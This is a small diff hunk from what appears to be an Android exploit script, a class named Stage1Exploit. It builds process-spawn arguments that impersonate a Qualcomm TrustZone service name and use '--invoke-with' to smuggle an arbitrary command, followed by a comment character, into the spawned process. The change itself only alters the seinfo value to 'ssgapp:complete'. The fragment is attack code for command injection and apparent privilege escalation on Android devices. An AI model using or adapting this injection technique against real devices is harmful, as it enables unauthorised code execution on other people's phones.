@@ -196,7 +196,7 @@ class Stage1Exploit:
             "--runtime-args",
             "--nice-name=com.qualcomm.qti.qms.service.trustzoneaccess",
             "--target-sdk-version=28",
-            "--seinfo=ssgapp",
+            "--seinfo=ssgapp:complete",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
